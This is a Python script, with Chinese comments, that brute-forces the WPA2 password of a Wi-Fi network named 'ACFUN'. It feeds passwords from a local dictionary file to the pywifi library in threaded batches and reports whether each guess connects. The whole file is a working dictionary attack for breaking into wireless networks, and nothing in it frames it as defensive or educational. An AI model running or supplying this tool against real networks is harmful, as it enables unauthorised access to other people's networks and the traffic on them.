import time
import pywifi
from pywifi import const
import threading


class WifiThread(threading.Thread):
	def __init__(self, password):
		super().__init__()  # 调用父类被重写的方法
		self.password = password

	def run(self):  # run方法是子线程运行的方法,子线程会从run开始运行
		global sem  # 全局变量，限制线程数量
		with sem:
			with mutex:
				if self.test_wifi_connect(self.password):
					global ispassword  # 标识状态
					ispassword = True  # 初值是 密码正确
					print(self.password, " 密码正确")
				else:
					print(self.password, " 密码错误")

	def test_wifi_connect(self, pass_str):
		wifi = pywifi.PyWiFi()  # 创建一个wifi对象
		interface = wifi.interfaces()[0]  # 抓取无线网卡列表第一个无线网卡
		interface.disconnect()  # 断开无线网卡链接
		time.sleep(3)  # 断开以后缓冲3秒

		profile = pywifi.Profile()  # 配置文件
		profile.ssid = "ACFUN"  # 设置wifi名称
		profile.auth = const.AUTH_ALG_OPEN  # 需要密码链接
		profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
		profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
		profile.key = pass_str  # 测试密码成功或者失败

		interface.remove_all_network_profiles()  # 删除其他所有配置文件
		tmp_profile = interface.add_network_profile(profile)  # 加载配置文件

		interface.connect(tmp_profile)  # 进行连接
		time.sleep(5)  # 5秒之内测试连接是否成功。
		isOK = False
		if interface.status() == const.IFACE_CONNECTED:
			isOK = True
			print("%s 链接成功,密码是:%s" % (profile.ssid, pass_str))

		else:
			print("WIFI %s 链接失败" % profile.ssid)

		interface.disconnect()  # 断开连接
		del wifi
		del interface
		return isOK


ispassword = False
mutex = threading.Lock()
sem = threading.Semaphore(10)  # 最大线程数量为10  Semaphore:信号量的意思

file_path = r"E:\Python练习代码\PythonFile\分类练习\code_破解WiFi\pass1.txt"
# 打开密码字典,获取密码
file = open(file_path, "r")


while True:
	thread_list = []

	for i in range(10):
		line = file.readline().strip()  # 一次读取一行,并且去掉空格
		# print(line)

		wifi_thd = WifiThread(line)  # 创建线程对象,line是实参
		wifi_thd.start()  # 开启线程,这里会自动去调用run()方法开始运行,但是不能直接写成run(),否则会出错
		thread_list.append(wifi_thd)  # 添加到线程列表

	for thd in thread_list:
		thd.join()  # 等待子线程执行完成

	for thd in thread_list:
		del thd  # 手动回收子线程资源,防止内存泄露

	time.sleep(5)

	if not line:  # 密码为空，跳出
		break
	if ispassword:  # 密码正确停止判断
		break

file.close()
